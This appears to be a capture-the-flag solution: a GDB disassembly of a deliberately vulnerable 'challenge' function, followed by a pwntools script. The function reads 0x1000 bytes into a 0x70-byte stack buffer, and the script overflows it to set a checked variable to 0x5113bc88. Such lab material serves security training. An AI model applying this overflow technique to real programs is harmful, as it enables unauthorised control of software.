'''
Dump of assembler code for function challenge:
   0x0000000000401f8c <+0>:     endbr64
   0x0000000000401f90 <+4>:     push   rbp
   0x0000000000401f91 <+5>:     mov    rbp,rsp
   0x0000000000401f94 <+8>:     sub    rsp,0xa0
   0x0000000000401f9b <+15>:    mov    DWORD PTR [rbp-0x84],edi
   0x0000000000401fa1 <+21>:    mov    QWORD PTR [rbp-0x90],rsi
   0x0000000000401fa8 <+28>:    mov    QWORD PTR [rbp-0x98],rdx
   0x0000000000401faf <+35>:    mov    rax,QWORD PTR fs:0x28
   0x0000000000401fb8 <+44>:    mov    QWORD PTR [rbp-0x8],rax
   0x0000000000401fbc <+48>:    xor    eax,eax
   0x0000000000401fbe <+50>:    lea    rdx,[rbp-0x70]
   0x0000000000401fc2 <+54>:    mov    eax,0x0
   0x0000000000401fc7 <+59>:    mov    ecx,0xd
--Type <RET> for more, q to quit, c to continue without paging--
   0x0000000000401fcc <+64>:    mov    rdi,rdx
   0x0000000000401fcf <+67>:    rep stos QWORD PTR es:[rdi],rax
   0x0000000000401fd2 <+70>:    mov    QWORD PTR [rbp-0x78],0x0
   0x0000000000401fda <+78>:    mov    QWORD PTR [rbp-0x78],0x1000
   0x0000000000401fe2 <+86>:    mov    rax,QWORD PTR [rbp-0x78]
   0x0000000000401fe6 <+90>:    mov    rsi,rax
   0x0000000000401fe9 <+93>:    lea    rdi,[rip+0x1120]        # 0x403110
   0x0000000000401ff0 <+100>:   mov    eax,0x0
   0x0000000000401ff5 <+105>:   call   0x401120 <printf@plt>
   0x0000000000401ffa <+110>:   mov    rdx,QWORD PTR [rbp-0x78]
   0x0000000000401ffe <+114>:   lea    rax,[rbp-0x70]
   0x0000000000402002 <+118>:   mov    rsi,rax
   0x0000000000402005 <+121>:   mov    edi,0x0
   0x000000000040200a <+126>:   call   0x401140 <read@plt>
--Type <RET> for more, q to quit, c to continue without paging--
   0x000000000040200f <+131>:   mov    DWORD PTR [rbp-0x7c],eax
   0x0000000000402012 <+134>:   cmp    DWORD PTR [rbp-0x7c],0x0
   0x0000000000402016 <+138>:   jns    0x402044 <challenge+184>
   0x0000000000402018 <+140>:   call   0x4010e0 <__errno_location@plt>
   0x000000000040201d <+145>:   mov    eax,DWORD PTR [rax]
   0x000000000040201f <+147>:   mov    edi,eax
   0x0000000000402021 <+149>:   call   0x401180 <strerror@plt>
   0x0000000000402026 <+154>:   mov    rsi,rax
   0x0000000000402029 <+157>:   lea    rdi,[rip+0x1108]        # 0x403138
   0x0000000000402030 <+164>:   mov    eax,0x0
   0x0000000000402035 <+169>:   call   0x401120 <printf@plt>
   0x000000000040203a <+174>:   mov    edi,0x1
   0x000000000040203f <+179>:   call   0x401170 <exit@plt>
   0x0000000000402044 <+184>:   mov    eax,DWORD PTR [rbp-0xc]
--Type <RET> for more, q to quit, c to continue without paging--
   0x0000000000402047 <+187>:   test   eax,eax
   0x0000000000402049 <+189>:   je     0x402061 <challenge+213>
   0x000000000040204b <+191>:   lea    rdi,[rip+0x110e]        # 0x403160
   0x0000000000402052 <+198>:   call   0x4010f0 <puts@plt>
   0x0000000000402057 <+203>:   mov    edi,0x1
   0x000000000040205c <+208>:   call   0x401170 <exit@plt>
   0x0000000000402061 <+213>:   mov    eax,DWORD PTR [rbp-0x10]
   0x0000000000402064 <+216>:   cmp    eax,0x5113bc88
   0x0000000000402069 <+221>:   jne    0x402075 <challenge+233>
   0x000000000040206b <+223>:   mov    eax,0x0
'''

from pwn import *

r = process('/challenge/binary-exploitation-var-control')

payload = (0x70 - 0x10) * b'A' + p32(0x5113bc88)

r.send(payload)
r.interactive()